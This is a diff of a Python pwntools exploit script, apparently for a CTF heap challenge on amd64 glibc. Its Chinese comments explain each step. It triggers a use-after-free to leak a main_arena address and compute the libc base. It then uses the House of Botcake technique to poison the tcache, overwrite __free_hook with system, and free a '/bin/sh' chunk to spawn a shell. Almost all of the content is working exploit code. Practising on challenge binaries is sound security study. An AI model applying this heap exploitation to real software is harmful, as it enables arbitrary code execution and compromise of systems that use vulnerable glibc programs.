@@ -3,7 +3,7 @@ from pwn import p64
 
 
 debug = 1
-gdb_is = 1
+gdb_is = 0
 # context(arch='i386',os = 'linux', log_level='DEBUG')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
@@ -36,22 +36,27 @@ def show(page):
     r.sendlineafter(b'Exit',b'3')
     r.sendlineafter(b'Index:', str(page).encode())
 
-for i in range(9):
+for i in range(10):
     add(i,0x80,b'0')
-for i in range(8):
-    delete(i)
-
-show(7)
+for i in range(7):
+	delete(i)
+delete(8)
+show(8) #将chunk8进入unsorted bin中
 main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) 
 print(f'main_arena_addr = {hex(main_arena_addr)}')
 libc_addr = main_arena_addr - 0x1ecbe0
 libc.address = libc_addr
 system_addr = libc.sym['system']
-
-
-print(f'libc_addr = {hex(libc_addr)}')
-print(f'system_addr = {hex(system_addr)}')
-
+#House of botcake （glibc > 2.25 且 UAF）
+delete(7) #将chunk7进入unsorted bin中 与8合并 与8合并但是7开头（后来后开头？）
+add(10,0x80,b'0') #将tcache bin中腾出空间
+delete(8) #将chunk8 加入tcache中
+add(11,0xff,b'\x00'*0x80+p64(0)+p64(0x91)+p64(libc.sym['__free_hook'])+b'\x00'*7) #写入到Tcache next中 通过 x /20gx addr + 大小来查看推算
+add(12,0x80,b'/bin/sh\x00')#将tcache中下一个变为free hook
+add(13,0x80,p64(system_addr))#写free_hook
+delete(12)
+# gdb.attach(r,'*b 0x4012ed')
+# pause()
 # r.sendlineafter()
 # r.send()
 # r.recvuntil()
